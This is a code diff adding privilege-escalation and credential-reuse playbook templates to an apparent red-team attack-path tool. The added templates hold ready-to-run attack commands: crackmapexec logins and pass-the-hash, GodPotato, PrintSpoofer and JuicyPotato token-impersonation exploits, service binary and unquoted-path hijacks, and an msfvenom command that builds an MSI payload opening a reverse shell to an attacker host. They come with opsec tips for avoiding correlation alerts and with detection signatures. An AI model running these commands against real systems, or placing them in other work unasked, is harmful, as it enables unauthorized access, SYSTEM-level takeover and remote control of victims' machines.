@@ -729,6 +729,220 @@ PLAYBOOK_TEMPLATES: dict[tuple[RelationType, str | None], PlaybookStepTemplate] 
         opsec_notes=["Minimize enumeration noise on authenticated sessions"],
         expected_output="Enumerated target environment and identified next steps",
     ),
+    # -----------------------------------------------------------------------
+    # Credential Sprawl
+    # -----------------------------------------------------------------------
+    (RelationType.CAN_AUTH_AS, None): PlaybookStepTemplate(
+        commands=[
+            {
+                "tool": "crackmapexec",
+                "command": "crackmapexec smb {target_ip} -u {username} -p '{credential_value}' -d {domain}",
+                "description": "Authenticate as target user using discovered credential",
+                "requires_root": False,
+                "requires_implant": False,
+            },
+        ],
+        prerequisites=[
+            "Credential value (password, hash, or token) for target user",
+            "Network access to authentication endpoint",
+        ],
+        opsec_notes=[
+            "Login as discovered user generates standard logon events",
+            "Event 4624 — check if target account is monitored or honeypot",
+        ],
+        expected_output="Authenticated session as target user",
+        detection_signatures=[
+            "Windows Event 4624 (logon from unexpected source for target user)",
+        ],
+    ),
+    (RelationType.CREDENTIAL_REUSE, None): PlaybookStepTemplate(
+        commands=[
+            {
+                "tool": "crackmapexec",
+                "command": "crackmapexec smb {target_ip} -u {username} -p '{credential_value}' -d {domain}",
+                "description": "Authenticate to target using reused credential",
+                "requires_root": False,
+                "requires_implant": False,
+            },
+        ],
+        prerequisites=[
+            "Reused credential value (password or hash)",
+            "Network access to target (port 445)",
+        ],
+        opsec_notes=[
+            "Credential reuse is common — same cred from multiple sources may trigger correlation alerts",
+            "Event 4624 type 3 — SMB logon from unexpected source",
+            "Consider using one source IP to avoid multi-source correlation",
+        ],
+        fallback_commands=[
+            {
+                "tool": "crackmapexec",
+                "command": "crackmapexec smb {target_ip} -u {username} -H '{hash}' -d {domain}",
+                "description": "Pass-the-Hash variant with reused NTLM hash",
+                "requires_root": False,
+                "requires_implant": False,
+            },
+        ],
+        expected_output="Authenticated session on target host",
+        detection_signatures=[
+            "Windows Event 4624 (logon type 3 — same credential from multiple sources)",
+            "SIEM correlation: same account authenticating from multiple hosts",
+        ],
+    ),
+    # -----------------------------------------------------------------------
+    # Privilege Escalation
+    # -----------------------------------------------------------------------
+    (RelationType.CAN_PRIVESC, "T1134.001"): PlaybookStepTemplate(
+        commands=[
+            {
+                "tool": "GodPotato",
+                "command": "GodPotato.exe -cmd 'cmd /c whoami'",
+                "description": "Exploit SeImpersonatePrivilege via GodPotato",
+                "requires_root": False,
+                "requires_implant": True,
+            },
+            {
+                "tool": "PrintSpoofer",
+                "command": "PrintSpoofer64.exe -i -c cmd",
+                "description": "Exploit SeImpersonatePrivilege via PrintSpoofer",
+                "requires_root": False,
+                "requires_implant": True,
+            },
+        ],
+        prerequisites=[
+            "SeImpersonatePrivilege assigned to current token",
+            "Running as service account (IIS, MSSQL, etc.)",
+        ],
+        opsec_notes=[
+            "Token impersonation may trigger EDR — test in lab first",
+            "GodPotato works on modern Windows (2019/2022)",
+            "JuicyPotato is legacy alternative for older systems",
+        ],
+        fallback_commands=[
+            {
+                "tool": "JuicyPotato",
+                "command": "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c '{{CLSID}}'",
+                "description": "Legacy SeImpersonate exploit (pre-2019)",
+                "requires_root": False,
+                "requires_implant": True,
+            },
+        ],
+        expected_output="SYSTEM shell or command output as NT AUTHORITY\\SYSTEM",
+        detection_signatures=[
+            "Sysmon Event 1: suspicious child process from service account",
+            "Named pipe creation matching potato tool patterns",
+        ],
+    ),
+    (RelationType.CAN_PRIVESC, "T1574.010"): PlaybookStepTemplate(
+        commands=[
+            {
+                "tool": "manual",
+                "command": "# 1. Identify modifiable service binary\nsc qc {service_name}\nicacls {service_binary_path}\n# 2. Replace binary\ncopy {service_binary_path} {service_binary_path}.bak\ncopy payload.exe {service_binary_path}\n# 3. Restart service\nsc stop {service_name} && sc start {service_name}",
+                "description": "Replace modifiable service binary for SYSTEM execution",
+                "requires_root": False,
+                "requires_implant": True,
+            },
+        ],
+        prerequisites=[
+            "Write access to service binary path",
+            "Ability to restart the service (or wait for reboot)",
+        ],
+        opsec_notes=[
+            "Service binary replacement is highly detected by EDR",
+            "Backup original binary and restore after exploitation",
+            "Service crash may alert administrators",
+        ],
+        expected_output="Payload executes as SYSTEM when service restarts",
+        detection_signatures=[
+            "Windows Event 7034 (service crashed unexpectedly)",
+            "Windows Event 7045 (new service installed)",
+            "File integrity monitoring on service binaries",
+        ],
+    ),
+    (RelationType.CAN_PRIVESC, "T1574.009"): PlaybookStepTemplate(
+        commands=[
+            {
+                "tool": "manual",
+                "command": '# 1. Identify unquoted service path\nwmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v "C:\\Windows\\\\" | findstr /i /v "\\""\n# 2. Place executable in path gap\ncopy payload.exe "C:\\Program Files\\Vulnerable App\\Vulnerable.exe"\n# 3. Restart service\nsc stop {service_name} && sc start {service_name}',
+                "description": "Exploit unquoted service path for privilege escalation",
+                "requires_root": False,
+                "requires_implant": True,
+            },
+        ],
+        prerequisites=[
+            "Unquoted service path with space in directory name",
+            "Write access to intermediate path directory",
+        ],
+        opsec_notes=[
+            "Low reliability — depends on directory write permissions",
+            "Service may not restart cleanly with injected binary",
+        ],
+        expected_output="Payload executes as service account (often SYSTEM)",
+        detection_signatures=[
+            "Unexpected executable in Program Files subdirectory",
+            "Windows Event 7034/7045 for affected service",
+        ],
+    ),
+    (RelationType.CAN_PRIVESC, "T1548.002"): PlaybookStepTemplate(
+        commands=[
+            {
+                "tool": "msiexec",
+                "command": "msiexec /quiet /qn /i payload.msi",
+                "description": "Install malicious MSI with AlwaysInstallElevated",
+                "requires_root": False,
+                "requires_implant": True,
+            },
+        ],
+        prerequisites=[
+            "AlwaysInstallElevated enabled in HKLM and HKCU",
+            "Ability to create or transfer MSI payload",
+        ],
+        opsec_notes=[
+            "MSI installation logged in Application Event Log",
+            "Consider using msfvenom to generate MSI payload",
+            "msiexec /quiet suppresses UI but not event logs",
+        ],
+        fallback_commands=[
+            {
+                "tool": "msfvenom",
+                "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f msi -o payload.msi",
+                "description": "Generate MSI payload with reverse shell",
+                "requires_root": False,
+                "requires_implant": False,
+            },
+        ],
+        expected_output="SYSTEM-level code execution via MSI install",
+        detection_signatures=[
+            "Windows Installer Event 1033/1034 (MSI install/complete)",
+            "AppLocker/WDAC: msiexec loading unsigned MSI",
+        ],
+    ),
+    (RelationType.CAN_PRIVESC, None): PlaybookStepTemplate(
+        commands=[
+            {
+                "tool": "manual",
+                "command": "# Review finding details for specific privilege escalation technique\n# Finding: {finding_title}\n# Technique: {technique_id}",
+                "description": "Generic privilege escalation — review finding for exploitation details",
+                "requires_root": False,
+                "requires_implant": True,
+            },
+        ],
+        prerequisites=[
+            "Access to target host at current privilege level",
+            "Review finding details for specific requirements",
+        ],
+        opsec_notes=[
+            "Privilege escalation techniques vary in detection risk",
+            "Test in lab environment before production use",
+        ],
+        expected_output="Elevated privileges on target host",
+        detection_signatures=[
+            "Varies by technique — review MITRE ATT&CK detection guidance",
+        ],
+    ),
+    # -----------------------------------------------------------------------
+    # Trust Relationships
+    # -----------------------------------------------------------------------
     (RelationType.TRUSTS, None): PlaybookStepTemplate(
         commands=[
             {
